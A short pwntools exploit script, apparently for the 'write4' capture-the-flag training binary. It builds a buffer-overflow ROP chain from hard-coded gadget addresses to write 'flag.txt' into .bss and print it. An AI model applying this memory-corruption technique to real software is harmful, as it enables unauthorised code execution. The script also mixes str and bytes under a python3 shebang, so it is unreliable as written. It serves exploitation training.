#!/usr/bin/python3
from pwn import *
gs = '''
break pwnme
continue
'''
elf = context.binary = ELF('./write4')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./write4', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./write4')
r = start()
#========= exploit here ===================
movr14r15 = 0x400628
printfile = 0x400510
popr14r15  = 0x400690
poprdi = 0x400693
bss = 0x601038

payload = "A" * 40
payload += p64(popr14r15)
payload += p64(bss)
payload += "flag.txt"
payload += p64(movr14r15)
payload += p64(poprdi)
payload += p64(bss)
payload += p64(printfile)

r.sendlineafter(">",payload)

#========= interactive ====================
r.interactive()
